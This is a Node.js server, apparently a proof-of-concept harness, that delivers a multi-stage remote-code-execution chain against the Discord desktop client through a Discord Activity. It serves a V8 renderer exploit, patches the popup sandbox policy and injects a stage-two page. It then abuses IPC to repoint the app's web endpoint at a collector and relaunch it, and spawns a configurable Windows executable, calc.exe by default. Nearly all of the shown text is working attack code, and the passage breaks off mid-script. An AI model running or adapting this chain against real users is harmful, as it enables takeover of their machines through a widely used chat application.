"use strict";

const fs = require("fs"), http = require("http"), path = require("path"), crypto = require("crypto"), {URL: URL} = require("url"), ROOT = __dirname, SOURCE_HTML = path.join(ROOT, "exploit.html"), LEAK_HTML = SOURCE_HTML, WASM_BUILDER = path.join(ROOT, "wasm-module-builder.js"), LOG_DIR = path.join(__dirname, "logs"), PORT = Number(process.env.ACTIVITY_PORT || 3077), CANDIDATE_OVERRIDE = (process.env.ACTIVITY_CANDIDATE_OVERRIDE || "71ef5").trim().toLowerCase().replace(/^0x/, ""), PROTOCOL_LEASE_MS = Number(process.env.ACTIVITY_PROTOCOL_LEASE_MS || 3e5), PROTOCOL_GENERATION = crypto.randomBytes(12).toString("hex");

function normalizeRcePayloadOrigin(value) {
    const text = String(value || "").trim();
    if (!text) return "";
    const parsed = new URL(text);
    if (parsed.origin !== text || "/" !== parsed.pathname) throw new Error("ACTIVITY_PUBLIC_ORIGIN must be an HTTP(S) origin without a path");
    if ("https:" !== parsed.protocol) throw new Error("ACTIVITY_PUBLIC_ORIGIN must use HTTPS");
    return parsed.origin;
}

let rcePayloadOrigin = normalizeRcePayloadOrigin(process.env.ACTIVITY_PUBLIC_ORIGIN || "");

const RCE_SPAWN_PATH = path.resolve(process.env.ACTIVITY_RCE_SPAWN_PATH || "C:\\Windows\\System32\\calc.exe"), RCE_RECOVERY_FLAG = process.env.ACTIVITY_RCE_RECOVERY_FLAG ? path.resolve(process.env.ACTIVITY_RCE_RECOVERY_FLAG) : path.join(__dirname, "rce-recovery.ready"), RCE_NATIVE_CANDIDATE_OVERRIDES = (process.env.ACTIVITY_RCE_NATIVE_CANDIDATES || "").split(",").map(value => value.trim().toLowerCase().replace(/^0x/, "")).filter(Boolean);

if (RCE_NATIVE_CANDIDATE_OVERRIDES.some(value => !/^[0-9a-f]{1,8}$/.test(value))) throw new Error("ACTIVITY_RCE_NATIVE_CANDIDATES must be a comma-separated list of hex values");

const RCE_NATIVE_DIAGNOSTIC = (process.env.ACTIVITY_RCE_NATIVE_DIAGNOSTIC || "").trim().toLowerCase();

if ("" !== RCE_NATIVE_DIAGNOSTIC && "leak" !== RCE_NATIVE_DIAGNOSTIC) throw new Error("ACTIVITY_RCE_NATIVE_DIAGNOSTIC must be empty or leak");

const RCE_STAGE1_DIAGNOSTIC = (process.env.ACTIVITY_RCE_STAGE1_DIAGNOSTIC || "").trim().toLowerCase();

if ("" !== RCE_STAGE1_DIAGNOSTIC && "full" !== RCE_STAGE1_DIAGNOSTIC) throw new Error("ACTIVITY_RCE_STAGE1_DIAGNOSTIC must be empty or full");

let protocolDispatched = !1, protocolDispatchAt = null, protocolLease = null;

const protocolInstances = new Map, protocolAttemptedInstances = new Set;

let rceCollectorOrigin = "", rceNativePageRequests = 0, rceNativePayloadArmed = !1, rceNativeExitSuccess = !1, rceNativeExitMarker = "", rceRecoveryRelaunchRequested = !1;

fs.mkdirSync(LOG_DIR, {
    recursive: !0
});

const runStamp = (new Date).toISOString().replace(/[:.]/g, "-"), logPath = path.join(LOG_DIR, `live-${runStamp}.log`);

function append(line) {
    const text = `[${(new Date).toISOString()}] ${line}\n`;
    fs.appendFileSync(logPath, text), process.stdout.write(text);
}

function currentCandidate() {
    return CANDIDATE_OVERRIDE;
}

function currentNativeCandidate(requestNumber = rceNativePageRequests) {
    const candidates = [ ...RCE_NATIVE_CANDIDATE_OVERRIDES.length ? RCE_NATIVE_CANDIDATE_OVERRIDES : [ currentCandidate(), "71dcd" ] ].filter((value, index, values) => values.indexOf(value) === index);
    return candidates[Math.max(0, requestNumber - 1) % candidates.length];
}

function rceRecoveryReady() {
    try {
        return fs.statSync(RCE_RECOVERY_FLAG).isFile();
    } catch {
        return !1;
    }
}

function activeProtocolInstances(now = Date.now()) {
    const active = [];
    for (const [instance, state] of protocolInstances) now - state.lastSeen <= 15e3 && active.push(instance);
    return active;
}

function protocolState(now = Date.now()) {
    return protocolLease && now >= protocolLease.expiresAt && !protocolDispatched && (append(`PROTOCOL_LEASE_EXPIRED instance=${protocolLease.instance} attempt=${protocolLease.attempt}`),
    protocolLease = null), {
        dispatched: protocolDispatched,
        dispatchAt: protocolDispatchAt,
        activeInstances: activeProtocolInstances(now).length,
        requiredInstances: 1,
        attemptedInstances: protocolAttemptedInstances.size,
        lease: protocolLease ? {
            instance: protocolLease.instance,
            attempt: protocolLease.attempt,
            expiresAt: protocolLease.expiresAt,
            payloadIssued: protocolLease.payloadIssued
        } : null
    };
}

function registerProtocolInstance(instance) {
    if (!/^[a-zA-Z0-9_-]{8,96}$/.test(instance)) throw new Error("invalid protocol instance identifier");
    const now = Date.now(), existing = protocolInstances.get(instance);
    return protocolInstances.set(instance, {
        firstSeen: existing?.firstSeen || now,
        lastSeen: now
    }), existing || append(`PROTOCOL_INSTANCE_REGISTER instance=${instance}`), protocolState(now);
}

function validatedCollectorOrigin(req, value) {
    let parsed;
    try {
        parsed = new URL(value);
    } catch {
        throw new Error("invalid collector origin");
    }
    if (parsed.origin !== value || "https:" !== parsed.protocol && "http:" !== parsed.protocol) throw new Error("collector must be an http(s) origin");
    const allowedHosts = new Set([ req.headers.host, req.headers["x-forwarded-host"], req.headers["x-original-host"] ].flatMap(header => String(header || "").split(",")).map(header => header.trim().toLowerCase()).filter(Boolean)), isDiscordActivityProxy = "https:" === parsed.protocol && /^\d+\.discordsays\.com$/i.test(parsed.hostname);
    if (!allowedHosts.has(parsed.host.toLowerCase()) && !isDiscordActivityProxy) throw new Error("collector origin does not match the request host");
    return parsed.origin;
}

function send(res, status, body, type = "text/plain; charset=utf-8", simulateProxyCsp = !1) {
    let responseBody = body;
    const headers = {
        "content-type": type,
        "cache-control": "no-store"
    }, data = Buffer.isBuffer(responseBody) ? responseBody : Buffer.from(String(responseBody));
    headers["content-length"] = data.length, res.writeHead(status, headers), res.end(data);
}

const server = http.createServer(async (req, res) => {
    const url = new URL(req.url, `http://${req.headers.host || "127.0.0.1"}`);
    append(`${req.socket.remoteAddress || "-"} ${req.method} ${url.pathname}${url.search}`);
    try {
        if ("/health" === url.pathname) return send(res, 200, `ok mode=rce-calc candidate=${currentCandidate()} log=${logPath}\n`);
        if ("/set-public-origin" === url.pathname && "POST" === req.method) {
            const remote = String(req.socket.remoteAddress || "");
            return /^(?:127\.0\.0\.1|::1|::ffff:127\.0\.0\.1)$/.test(remote) ? protocolDispatched ? send(res, 409, "dispatch already occurred\n") : (rcePayloadOrigin = normalizeRcePayloadOrigin(url.searchParams.get("origin") || ""),
            rcePayloadOrigin ? (append(`RCE_PUBLIC_ORIGIN ${rcePayloadOrigin}`), send(res, 200, `origin=${rcePayloadOrigin}\n`)) : send(res, 400, "origin is required\n")) : send(res, 403, "loopback request required\n");
        }
        if ("/protocol/register" === url.pathname) return url.searchParams.get("generation") !== PROTOCOL_GENERATION ? send(res, 409, "stale Activity generation\n") : send(res, 200, JSON.stringify(registerProtocolInstance(url.searchParams.get("instance") || "")), "application/json; charset=utf-8");
        if ("/protocol/lease" === url.pathname) return url.searchParams.get("generation") !== PROTOCOL_GENERATION ? send(res, 409, "stale Activity generation\n") : send(res, 200, JSON.stringify(function(instance) {
            const now = Date.now();
            registerProtocolInstance(instance);
            const state = protocolState(now);
            if (state.dispatched) return {
                status: "dispatched",
                ...state
            };
            if (protocolLease) return protocolLease.instance === instance ? {
                status: "granted",
                token: protocolLease.token,
                attempt: protocolLease.attempt,
                expiresAt: protocolLease.expiresAt,
                ...protocolState(now)
            } : {
                status: "waiting-active-lease",
                ...protocolState(now)
            };
            if (protocolAttemptedInstances.has(instance)) return {
                status: "instance-exhausted",
                ...protocolState(now)
            };
            if (activeProtocolInstances(now).length < 1) return {
                status: "waiting-for-contexts",
                ...protocolState(now)
            };
            const attempt = protocolAttemptedInstances.size + 1, token = crypto.randomBytes(18).toString("hex");
            return protocolAttemptedInstances.add(instance), protocolLease = {
                instance: instance,
                token: token,
                attempt: attempt,
                expiresAt: now + PROTOCOL_LEASE_MS,
                payloadIssued: !1
            }, append(`PROTOCOL_LEASE_GRANTED instance=${instance} attempt=${attempt} expiresAt=${protocolLease.expiresAt}`),
            {
                status: "granted",
                token: token,
                attempt: attempt,
                expiresAt: protocolLease.expiresAt,
                ...protocolState(now)
            };
        }(url.searchParams.get("instance") || "")), "application/json; charset=utf-8");
        if ("/protocol/state" === url.pathname) return send(res, 200, JSON.stringify(protocolState()), "application/json; charset=utf-8");
        if ("/payload" === url.pathname) {
            if ("rce-popup-patch" !== url.searchParams.get("stage")) return send(res, 404, "not found\n");
            const instance = url.searchParams.get("instance") || "", token = url.searchParams.get("token") || "";
            if (!protocolLease || protocolLease.instance !== instance || protocolLease.token !== token || Date.now() >= protocolLease.expiresAt || protocolDispatched) return send(res, 409, "invalid or expired lease\n");
            const collectorOrigin = validatedCollectorOrigin(req, url.searchParams.get("origin") || ""), payload = function(options) {
                const html = function({collectorOrigin: collectorOrigin, instance: instance, token: token, attempt: attempt}) {
                    let html = fs.readFileSync(SOURCE_HTML, "utf8");
                    return html = html.replace('|| "6bb39"', `|| "${currentCandidate()}"`), html = html.replace("const params = new URLSearchParams(location.search);", 'const params = new URLSearchParams(location.search);\n        params.set("ofs", "7");\n        params.set("native", "1");\n        params.set("payload", "popup_patch");\n        params.set("ipc_profile", "discord37_6");'),
                    html = html.replace('<meta charset="utf-8" />', `<meta charset="utf-8" />\n<base href="${collectorOrigin}/">\n<meta name="live-popup-patch-attempt" content="${attempt}">`),
                    html = html.replace('const line = "DBG:" + s;\n        console.log(line);', 'const line = "DBG:" + s;\n        console.log(line);\n        try { if (typeof document === "undefined" && typeof postMessage === "function") postMessage(line); } catch (_) {}'),
                    html = html.replace('const el = document.getElementById("log");', 'const el = typeof document !== "undefined" ? document.getElementById("log") : null;'),
                    html;
                }(options), scripts = [], scriptPattern = /<script(?:\s+src="([^"]+)")?[^>]*>([\s\S]*?)<\/script>/gi;
                for (const match of html.matchAll(scriptPattern)) if (match[1]) {
                    if (!match[1].endsWith("wasm-module-builder.js")) throw new Error(`Unexpected external exploit script: ${match[1]}`);
                    scripts.push(fs.readFileSync(WASM_BUILDER, "utf8"));
                } else scripts.push(match[2]);
                if (scripts.length < 3) throw new Error("Popup-patch exploit scripts were not extracted");
                return scripts.join("\n;\n");
            }({
                collectorOrigin: collectorOrigin,
                instance: instance,
                token: token,
                attempt: protocolLease.attempt
            });
            return rceCollectorOrigin = collectorOrigin, append(`RCE_POPUP_PATCH_PAYLOAD_ISSUED instance=${instance} attempt=${protocolLease.attempt} bytes=${payload.length} collector=${collectorOrigin}`),
            send(res, 200, payload, "text/javascript; charset=utf-8");
        }
        if ("/rce-stage2" === url.pathname) {
            if (!rcePayloadOrigin) return send(res, 404, "stage two is not armed\n");
            const instance = url.searchParams.get("instance") || "", token = url.searchParams.get("token") || "";
            if (!protocolLease || protocolLease.instance !== instance || protocolLease.token !== token || Date.now() >= protocolLease.expiresAt || protocolDispatched) return send(res, 409, "invalid or expired stage-two lease\n");
            const collectorOrigin = validatedCollectorOrigin(req, url.searchParams.get("origin") || "");
            rceCollectorOrigin = collectorOrigin, protocolLease.payloadIssued = !0;
            const payload = function(html) {
                const external = '<script src="wasm-module-builder.js"><\/script>';
                if (!html.includes(external)) throw new Error("Canonical wasm builder tag was not found");
                const builder = fs.readFileSync(WASM_BUILDER, "utf8");
                if (/<\/script/i.test(builder)) throw new Error("Wasm builder cannot be safely inlined into HTML");
                return html.replace(external, `<script>\n${builder}\n<\/script>`);
            }(function({collectorOrigin: collectorOrigin, instance: instance, token: token, attempt: attempt}) {
                const sequenceSetters = [ {
                    channel: "DISCORD_SETTINGS_SET",
                    args: [ "WEBAPP_ENDPOINT", collectorOrigin ]
                }, {
                    channel: "DISCORD_SETTINGS_SET",
                    args: [ "WEBAPP_PATH", "/native-proof" ]
                }, {
                    channel: "DISCORD_APP_RELAUNCH",
                    args: []
                } ].flatMap((invocation, sequenceIndex) => [ `params.set("ipc_seq${sequenceIndex}_channel", ${JSON.stringify(invocation.channel)});`, ...invocation.args.map((value, argumentIndex) => `params.set("ipc_seq${sequenceIndex}_arg${argumentIndex}", ${JSON.stringify(value)});`) ]).join("\n        ");
                let html = fs.readFileSync(SOURCE_HTML, "utf8");
                html = html.replace('|| "6bb39"', `|| "${currentCandidate()}"`), html = html.replace("const params = new URLSearchParams(location.search);", `const params = new URLSearchParams(location.search);\n        params.set("ofs", "7");\n        params.set("native", "1");\n        params.set("payload", "ipc_native");\n        params.set("ipc_profile", "discord37_6");\n        params.set("ipc_method", "invoke");\n        params.set("ipc_delay_before_last_ms", "3000");\n        ${sequenceSetters}`),
                html = html.replace('<meta charset="utf-8" />', `<meta charset="utf-8" />\n<base href="${collectorOrigin}/">\n<meta name="live-rce-attempt" content="${attempt}">\n<script>\nsetTimeout(() => {\n  try { fetch(${JSON.stringify(collectorOrigin)} + "/collect?stage=rce-stage1&m=" + encodeURIComponent("DBG:STAGE2_RETRY attempt=${attempt}"), {mode:"no-cors",cache:"no-store"}).catch(() => {}); } catch (_) {}\n  location.reload();\n}, 15000);\n<\/script>`);
                const collectPrefix = `${collectorOrigin}/collect?stage=rce-stage1&instance=${encodeURIComponent(instance)}&token=${encodeURIComponent(token)}&m=`, stageOneCollectorStatement = "full" === RCE_STAGE1_DIAGNOSTIC ? `try { fetch(${JSON.stringify(collectPrefix)} + encodeURIComponent(line), {mode:"no-cors", cache:"no-store"}).catch(() => {}); } catch (_) {}` : "";
                return html = html.replace('const line = "DBG:" + s;\n        console.log(line);', `const line = "DBG:" + s;\n        console.log(line);\n        ${stageOneCollectorStatement}`),
                html;
            }({
                collectorOrigin: collectorOrigin,
                instance: instance,
                token: token,
                attempt: protocolLease.attempt
            }));
            return append(`RCE_STAGE2_PAGE_ISSUED instance=${instance} attempt=${protocolLease.attempt} bytes=${payload.length} collector=${collectorOrigin} payloadOrigin=${rcePayloadOrigin}`),
            send(res, 200, payload, "text/html; charset=utf-8", !0);
        }
        if ("/native-proof" === url.pathname) return rceCollectorOrigin ? (protocolDispatched || (protocolDispatched = !0,
        protocolDispatchAt = (new Date).toISOString(), append(`RCE_STAGE1_DISPATCH_OBSERVED instance=${protocolLease?.instance || "unknown"} attempt=${protocolLease?.attempt || 0} evidence=native-proof-request`)),
        rceNativePageRequests++, append(`RCE_NATIVE_PAGE_REQUEST request=${rceNativePageRequests} candidate=${currentNativeCandidate(rceNativePageRequests)} armed=${rceNativePayloadArmed} recovery=${rceRecoveryReady()}`),
        send(res, 200, rceNativePayloadArmed ? function() {
            if (!rceCollectorOrigin) throw new Error("RCE collector origin is not initialized");
            return `<!doctype html>\n<meta charset="utf-8">\n<title>Native RCE verification and recovery</title>\n<pre id="out">Verifying native child and waiting for safe recovery...</pre>\n<script>\n(() => {\n  const collector = ${JSON.stringify(rceCollectorOrigin)};\n  const out = document.getElementById("out");\n  let attempts = 0;\n  let verified = false;\n  let recoveryRequested = false;\n  const report = (message) => {\n    out.textContent = message + "\\n" + out.textContent.slice(0, 4000);\n    return fetch(collector + "/collect?stage=rce-verify&m=" + encodeURIComponent(message), {mode:"no-cors", cache:"no-store"}).catch(() => {});\n  };\n  const requestRetry = async (reason) => {\n    await report("RCE_VERIFY_RETRY reason=" + reason);\n    try { await fetch(collector + "/rce/retry", {method:"POST", cache:"no-store"}); } catch (_) {}\n    setTimeout(() => location.reload(), 1000);\n  };\n  const verify = async () => {\n    attempts++;\n    try {\n      if (typeof DiscordNative !== "object" || typeof DiscordNative.processUtils?.getLastCrash !== "function") {\n        throw new Error("DiscordNative.processUtils.getLastCrash unavailable");\n      }\n      const crash = await DiscordNative.processUtils.getLastCrash();\n      await report("RCE_VERIFY " + JSON.stringify({\n        attempts,\n        reason: crash?.rendererCrashReason ?? null,\n        exitCode: crash?.rendererCrashExitCode ?? null,\n      }));\n      if (crash?.rendererCrashExitCode === 0x51a71338) {\n        verified = true;\n        await report("RCE_VERIFY_SUCCESS exitCode=0x51a71338");\n        return;\n      }\n      if (Number.isInteger(crash?.rendererCrashExitCode)) {\n        return requestRetry("wrong-exit-" + crash.rendererCrashExitCode);\n      }\n    } catch (error) {\n      await report("RCE_VERIFY_ERROR " + ((error && error.stack) || error));\n    }\n    if (attempts < 30) return setTimeout(verify, 500);\n    requestRetry("no-success-exit");\n  };\n  const recoveryPoll = async () => {\n    if (recoveryRequested) return;\n    try {\n      const state = await fetch(collector + "/rce/state", {cache:"no-store"}).then((response) => response.json());\n      if (state.recoveryReady && verified) {\n        recoveryRequested = true;\n        await report("RCE_RECOVERY_RELAUNCH_REQUESTED verified=" + verified);\n        setTimeout(() => {\n          try { DiscordNative.app.relaunch(); }\n          catch (error) { report("RCE_RECOVERY_RELAUNCH_ERROR " + error); }\n        }, 500);\n        return;\n      }\n    } catch (error) {\n      report("RCE_RECOVERY_POLL_ERROR " + ((error && error.message) || error));\n    }\n    setTimeout(recoveryPoll, 500);\n  };\n  verify();\n  recoveryPoll();\n})();\n<\/script>`;
        }() : function() {
            if (!rceCollectorOrigin) throw new Error("RCE collector origin is not initialized");
            const nativeCandidate = currentNativeCandidate(), leakDiagnostic = "leak" === RCE_NATIVE_DIAGNOSTIC, nativeCollectorStatement = leakDiagnostic ? `try { fetch(${JSON.stringify(rceCollectorOrigin)} + "/collect?stage=rce-native&m=" + encodeURIComponent(line), {mode:"no-cors", cache:"no-store"}).catch(() => {}); } catch (_) {}` : `if (line.startsWith("DBG:LIVE_NATIVE_PAGE") || line.startsWith("DBG:CANON_CREATEPROCESS_PAYLOAD") || line.startsWith("DBG:CANON_RESULT")) {\n          try { fetch(${JSON.stringify(rceCollectorOrigin)} + "/collect?stage=rce-native&m=" + encodeURIComponent(line), {mode:"no-cors", cache:"no-store"}).catch(() => {}); } catch (_) {}\n        }`;
            let html = fs.readFileSync(leakDiagnostic ? LEAK_HTML : SOURCE_HTML, "utf8");
            html = html.replace('|| "6bb39"', `|| "${nativeCandidate}"`), html = html.replace("const params = new URLSearchParams(location.search);", `const params = new URLSearchParams(location.search);\n        params.set("ofs", "7");\n        params.set("native", "1");\n        params.set("payload", "spawn");\n        params.set("spawn_path", ${JSON.stringify(RCE_SPAWN_PATH)});\n        params.set("spawn_dwell_ms", "10000");\n        params.set("invoke_delay_ms", "100");`),
            html = html.replace('<meta charset="utf-8" />', `<meta charset="utf-8" />\n<base href="${rceCollectorOrigin}/">`),
            html = html.replace('const line = "DBG:" + s;\n        console.log(line);', `const line = "DBG:" + s;\n        console.log(line);\n        ${nativeCollectorStatement}`),
            html = html.replace('    C("start");', '    C("LIVE_NATIVE_PAGE href=" + location.href + " process=" + typeof process + " require=" + typeof require);\n    C("start");'),
            html = html.replace(/<script>\s*"use strict";/, '<script type="text/plain" id="native-poc">\n    "use strict";');
            const finalScript = html.lastIndexOf("<\/script>");
            if (finalScript < 0) throw new Error("Canonical native proof script was not found");
            return html = html.slice(0, finalScript) + `<\/script>\n<script>\n(() => {\n  const delay = ${"leak" === RCE_NATIVE_DIAGNOSTIC ? 1e3 : 6e3};\n  const retryDelay = ${"leak" === RCE_NATIVE_DIAGNOSTIC ? 3e5 : 18e3};\n  const report = (message) => fetch(${JSON.stringify(rceCollectorOrigin)} + "/collect?stage=rce-native&m=" + encodeURIComponent(message), {mode:"no-cors", cache:"no-store"}).catch(() => {});\n  report("DBG:NATIVE_RETRY_DELAY ms=" + delay + " DiscordNative=" + typeof DiscordNative);\n  setTimeout(() => {\n    try {\n      (0, eval)(document.getElementById("native-poc").textContent);\n    } catch (error) {\n      report("DBG:NATIVE_EVAL_ERROR " + ((error && error.stack) || error));\n    }\n  }, delay);\n  setTimeout(() => {\n    report("DBG:NATIVE_FRESH_PROCESS_RETRY delay=" + retryDelay);\n    try {\n      if (typeof DiscordNative?.app?.relaunch === "function") {\n        DiscordNative.app.relaunch();\n        return;\n      }\n    } catch (error) {\n      report("DBG:NATIVE_RELAUNCH_RETRY_ERROR " + error);\n    }\n    location.reload();\n  }, retryDelay);\n})();\n<\/script>` + html.slice(finalScript + 9),
            html;
        }(), "text/html; charset=utf-8")) : send(res, 404, "native proof is not armed\n");
        if ("/rce/state" === url.pathname) return send(res, 200, JSON.stringify({
            mode: "rce-calc",
            stage1Dispatched: protocolDispatched,
            stage1DispatchAt: protocolDispatchAt,
            collectorOrigin: rceCollectorOrigin,
            payloadOrigin: rcePayloadOrigin,
            nativePageRequests: rceNativePageRequests,
            nativePayloadArmed: rceNativePayloadArmed,
            nativeExitSuccess: rceNativeExitSuccess,
            nativeExitMarker: rceNativeExitMarker,
            recoveryReady: rceRecoveryReady(),
            recoveryRelaunchRequested: rceRecoveryRelaunchRequested,
            restoredPageSeen: false
        }), "application/json; charset=utf-8");
        if ("/rce/retry" === url.pathname && "POST" === req.method) return rceNativePayloadArmed = !1,
        rceNativeExitSuccess = !1, rceNativeExitMarker = "", append("RCE_NATIVE_RETRY_ARMED"),
        send(res, 204, "");
        if ("/collect" === url.pathname) {
            const stage = url.searchParams.get("stage") || "", message = url.searchParams.get("m") || "";
            return append(`COLLECT stage=${stage} ${message}`), "rce-native" === stage && message.startsWith("DBG:CANON_CREATEPROCESS_PAYLOAD") && (rceNativePayloadArmed = !0,
            append(`RCE_NATIVE_PAYLOAD_ARMED marker=${message}`)), "rce-verify" === stage && ("RCE_VERIFY_SUCCESS exitCode=0x51a71338" === message && (rceNativeExitSuccess = !0,
            rceNativeExitMarker = message, append(`RCE_NATIVE_EXIT_SUCCESS marker=${message}`)),
            message.startsWith("RCE_VERIFY_RETRY ") && (rceNativePayloadArmed = !1, rceNativeExitSuccess = !1,
            rceNativeExitMarker = ""), message.startsWith("RCE_RECOVERY_RELAUNCH_REQUESTED ") && (rceRecoveryRelaunchRequested = !0,
            append(`RCE_RECOVERY_RELAUNCH_OBSERVED marker=${message}`))), send(res, 204, "");
        }
        if ("/log" === url.pathname) {
            const body = "POST" === req.method ? await function(req) {
                return new Promise(resolve => {
                    const chunks = [];
                    req.on("data", chunk => chunks.push(chunk)), req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8"))),
                    req.on("error", () => resolve(""));
                });
            }(req) : "", message = (body || url.searchParams.get("m") || "").replace(/\r?\n$/, "");
            return message && append(`CLIENT ${message}`), send(res, 204, "");
        }
        return "/wasm-module-builder.js" === url.pathname ? send(res, 200, fs.readFileSync(WASM_BUILDER), "text/javascript; charset=utf-8") : "/" === url.pathname || "/index.html" === url.pathname ? send(res, 200, `<!doctype html>\n<meta charset="utf-8">\n<meta name="viewport" content="width=device-width,initial-scale=1">\n<title>Discord native Calculator proof</title>\n<style>\nhtml,body{margin:0;min-height:100%;background:#11151d;color:#edf1f7;font:15px system-ui,Segoe UI,sans-serif}\nmain{max-width:780px;padding:24px}h1{font-size:22px;margin:0 0 12px}\nbutton{border:0;border-radius:6px;background:#5865f2;color:white;font-weight:700;padding:11px 16px}\nbutton:disabled{opacity:.45}pre{white-space:pre-wrap;line-height:1.4;background:#1a202b;border:1px solid #30394a;padding:14px;border-radius:8px}\n</style>\n<main>\n<h1>Native Calculator RCE validation</h1>\n<p>This runs the V8 renderer exploit, crosses the Electron boundary, relaunches the main renderer, and calls <code>CreateProcessW</code> for Windows Calculator.</p>\n<button id="run" disabled>Run Calculator proof</button>\n<pre id="out">registering this Activity context...</pre>\n</main>\n<script>\n(() => {\n  const out = document.getElementById("out");\n  const runButton = document.getElementById("run");\n\n\n\n  const activityNonce = (document.currentScript && document.currentScript.nonce) || "";\n  const protocolGeneration = ${JSON.stringify(PROTOCOL_GENERATION)};\n  const key = "discord-activityNative-rce-calc-instance";\n  let instance = sessionStorage.getItem(key);\n  if (!instance) {\n    instance = (crypto.randomUUID ? crypto.randomUUID() :\n      "instance-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2));\n    sessionStorage.setItem(key, instance);\n  }\n  let currentLease = null;\n  let currentPayload = null;\n  let stageTwoPayload = null;\n  let stageTwoUrl = null;\n  let launchedToken = null;\n  let activePopup = null;\n  let busy = false;\n  let launching = false;\n  let patchWorker = null;\n  let patchWorkerRuns = 0;\n  let patchWorkerWatchdog = null;\n  let popupTimer = null;\n  let popupAttempts = 0;\n  const payloadOrigin = ${JSON.stringify(rcePayloadOrigin)};\n\n  const emit = (message) => {\n    const line = new Date().toISOString() + " " + message;\n    out.textContent = line + "\\n" + out.textContent.slice(0, 6000);\n    try { fetch("/log?m=" + encodeURIComponent("RCE_ACTIVITY instance=" + instance + " " + message), {cache:"no-store"}).catch(() => {}); } catch (_) {}\n  };\n\n  const allowedMainOrigin = (value) => {\n    try {\n      const url = new URL(value);\n      const discordHosts = new Set([\n        "discord.com", "ptb.discord.com", "canary.discord.com",\n        "discordapp.com", "ptb.discordapp.com", "canary.discordapp.com",\n      ]);\n      if (url.protocol === "https:" && discordHosts.has(url.hostname)) return url.origin;\n      if (${JSON.stringify(!1)} && url.protocol === "http:" && url.hostname === "localhost") return url.origin;\n    } catch (_) {}\n    return null;\n  };\n\n  const mainOrigin = (() => {\n    const candidates = [document.referrer];\n    try { for (const value of location.ancestorOrigins || []) candidates.push(value); } catch (_) {}\n    for (const value of candidates) {\n      const origin = allowedMainOrigin(value);\n      if (origin) return origin;\n    }\n    return null;\n  })();\n\n  function launch(source) {\n    if (launching || !currentLease || !currentPayload || !stageTwoPayload) return;\n    if (launchedToken === currentLease.token && activePopup && !activePopup.closed) return;\n    if (!mainOrigin) {\n      emit("blocked: Discord main origin was not found in the frame ancestry");\n      return;\n    }\n    if (!payloadOrigin) {\n      emit("blocked: the distinct stage-two payload origin is not configured");\n      return;\n    }\n    launching = true;\n    runButton.disabled = true;\n    emit("user-authorized stage-one launch source=" + source + " attempt=" + currentLease.attempt + " mainOrigin=" + mainOrigin);\n    const name = "DISCORD_ACTIVITY_NATIVE_RCE_CALC_" + currentLease.attempt + "_" + instance.slice(0, 12);\n    const popupUrl = mainOrigin + "/popout";\n    const popupFeatures =\n      "width=854,height=480,menubar=no,toolbar=no,location=no,directories=no";\n    const baseline = window.open(\n      popupUrl,\n      name,\n      popupFeatures,\n    );\n    emit("popup-baseline=" + !!baseline);\n    if (baseline) {\n      try { baseline.close(); } catch (_) {}\n      launching = false;\n      emit("blocked: popup baseline unexpectedly succeeded before the sandbox-policy patch");\n      return;\n    }\n\n    patchWorkerRuns = 0;\n    popupAttempts = 0;\n    const retryWorker = (reason, currentWorker) => {\n      if (patchWorker !== currentWorker) return;\n      clearTimeout(patchWorkerWatchdog);\n      patchWorkerWatchdog = null;\n      currentWorker.terminate();\n      patchWorker = null;\n      emit("popup-patch-worker-retry reason=" + reason + " completedRuns=" + patchWorkerRuns);\n      setTimeout(() => startWorker(reason), 100);\n    };\n    const startWorker = (reason) => {\n      if (patchWorker !== null) return;\n      if (patchWorkerRuns >= 8) {\n        launching = false;\n        runButton.disabled = false;\n        emit("popup-patch-worker-exhausted runs=" + patchWorkerRuns + " reason=" + reason);\n        return;\n      }\n      patchWorkerRuns++;\n      const workerUrl = currentPayload + "&worker_attempt=" + patchWorkerRuns;\n      const currentWorker = new Worker(workerUrl, {\n        name: "discord-v8-popup-policy-patch-" + patchWorkerRuns,\n      });\n      patchWorker = currentWorker;\n      currentWorker.addEventListener("message", (event) => {\n        const line = String(event.data || "");\n        if (line.includes("CANON_RESULT=false") || line.includes("CANON_FAIL")) {\n          retryWorker(line.slice(0, 160), currentWorker);\n          return;\n        }\n        if (line.includes("CANON_POPUP_PATCH_PAYLOAD")) {\n          clearTimeout(patchWorkerWatchdog);\n          patchWorkerWatchdog = setTimeout(\n            () => retryWorker("armed-but-no-popup", currentWorker),\n            15000,\n          );\n          emit("popup-patch-worker-armed run=" + patchWorkerRuns);\n        }\n      });\n      currentWorker.addEventListener("error", (event) => {\n        retryWorker("error:" + event.message + ":" + event.lineno, currentWorker);\n      });\n      patchWorkerWatchdog = setTimeout(\n        () => retryWorker("watchdog", currentWorker),\n        15000,\n      );\n      emit("popup-patch-worker-started run=" + patchWorkerRuns);\n    };\n\n    const tryPopup = () => {\n      popupAttempts++;\n      const popup = window.open(\n        popupUrl,\n        name,\n        popupFeatures,\n      );\n      if (popup || popupAttempts <= 3 || popupAttempts % 10 === 0) {\n        emit("popup-patched attempt=" + popupAttempts + " returned=" + !!popup);\n      }\n      if (!popup) return;\n      clearInterval(popupTimer);\n      popupTimer = null;\n      clearTimeout(patchWorkerWatchdog);\n      patchWorkerWatchdog = null;\n      try {\n        const initialHref = popup.location.href;\n        popup.stop();\n        popup.document.open();\n        if (patchWorker) patchWorker.terminate();\n        patchWorker = null;\n        popup.document.write(stageTwoPayload);\n        popup.document.close();\n        activePopup = popup;\n        launchedToken = currentLease.token;\n        launching = false;\n        emit(\n          "popup-payload-written initialHref=" + initialHref +\n            " bytes=" + stageTwoPayload.length +\n            " source=" + stageTwoUrl\n        );\n      } catch (error) {\n        try { popup.close(); } catch (_) {}\n        if (patchWorker) patchWorker.terminate();\n        patchWorker = null;\n        launching = false;\n        runButton.disabled = false;\n        emit("popup-payload-write-failed " + error.name + ":" + error.message);\n      }\n    };\n\n    startWorker("initial");\n    popupTimer = setInterval(tryPopup, 750);\n  }\n\n  runButton.addEventListener("click", () => launch("click"));\n\n  async function prepareStageTwo(lease) {\n    stageTwoUrl =\n      "/rce-stage2?instance=" + encodeURIComponent(instance) +\n        "&token=" + encodeURIComponent(lease.token) +\n        "&origin=" + encodeURIComponent(location.origin);\n    stageTwoPayload = null;\n    runButton.disabled = true;\n    emit("stage-two-prefetch-start source=" + stageTwoUrl);\n    const response = await fetch(stageTwoUrl, {cache:"no-store"});\n    if (!response.ok) throw new Error("stage-two HTTP " + response.status);\n    const fetchedPayload = await response.text();\n    if (fetchedPayload.length < 100000 || !fetchedPayload.includes("CANON_START")) {\n      throw new Error("stage-two 